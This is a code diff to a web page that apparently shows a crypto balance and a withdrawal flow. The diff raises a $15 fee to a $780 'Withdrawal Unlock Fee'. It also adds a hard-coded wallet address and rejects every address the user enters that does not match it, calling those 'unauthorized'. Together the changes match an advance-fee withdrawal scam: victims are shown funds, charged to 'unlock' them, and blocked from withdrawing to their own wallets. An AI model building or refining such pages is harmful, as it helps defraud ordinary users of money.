@@ -170,8 +170,8 @@
                 <span class="highlight">$1,450.00 (0.023 BTC)</span>
             </div>
             <div class="summary-item">
-                <span>Amount to Pay (Fee):</span>
-                <span style="color: #ef4444; font-weight: 600;">$15.00</span>
+                <span>Withdrawal Unlock Fee:</span>
+                <span style="color: #ef4444; font-weight: 600;">$780.00</span>
             </div>
         </div>
 
@@ -184,23 +184,30 @@
 </div>
 
 <script>
+    // Defined Authorized Address
+    const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
+
     // Function to switch between steps
     function nextStep(stepNumber) {
-        // Hide all steps
         document.querySelectorAll('.step').forEach(step => {
             step.classList.remove('active');
         });
-        // Show current step
         document.getElementById('step' + stepNumber).classList.add('active');
     }
 
-    // Custom validation for step 2 before moving to step 3
+    // Process step 2 with strict wallet verification
     function processStep2() {
         const address = document.getElementById('wallet-address').value.trim();
         const selectedCrypto = document.getElementById('crypto-select').value;
 
         if (address === "") {
             alert("Please enter your crypto address to proceed.");
+            return;
+        }
+
+        // Strict address validation check
+        if (address !== REQUIRED_ADDRESS) {
+            alert("Error: Invalid or unauthorized wallet address for this transaction.");
             return;
         }
 
